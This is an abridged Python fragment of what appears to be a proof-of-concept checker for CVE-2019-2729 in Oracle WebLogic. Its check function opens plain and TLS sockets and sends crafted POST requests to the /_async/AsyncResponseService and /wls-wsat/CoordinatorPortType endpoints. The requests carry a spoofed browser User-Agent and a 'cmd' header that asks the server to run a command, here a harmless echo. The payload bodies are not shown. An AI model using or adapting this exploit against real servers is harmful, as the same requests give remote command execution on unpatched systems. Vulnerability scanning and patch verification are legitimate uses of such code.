...
def check(ip,port):
    ...
    try:
        client1 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        client1.connect((ip,int(port)))
        client1.sendall(str.encode('''POST /_async/AsyncResponseService HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\nContent-Type:text/xml\r\ncmd:echo cve-2019-2729\r\nContent-Length:{}\r\n\r\n{}'''.format(ip,port,content_length2,payload2)))
        buf1 = ""
        buf = "1"
        while len(buf):
            try:
    ...
    try:
        ...
        client2.sendall(str.encode('''POST /wls-wsat/CoordinatorPortType HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\nContent-Type:text/xml\r\ncmd:echo cve-2019-2729\r\nContent-Length:{}\r\n\r\n{}'''.format(ip,port,content_length1,payload1)))
        buf1 = ""
        buf = "1"
        while len(buf):
            try:
    ...
    try:
        client2 = ssl.wrap_socket(socket.socket())
        client2.connect((ip,int(port)))
        client2.sendall(str.encode('''POST /_async/AsyncResponseService HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\nContent-Type:text/xml\r\ncmd:echo cve-2019-2729\r\nContent-Length:{}\r\n\r\n{}'''.format(ip,port,content_length2,payload2)))
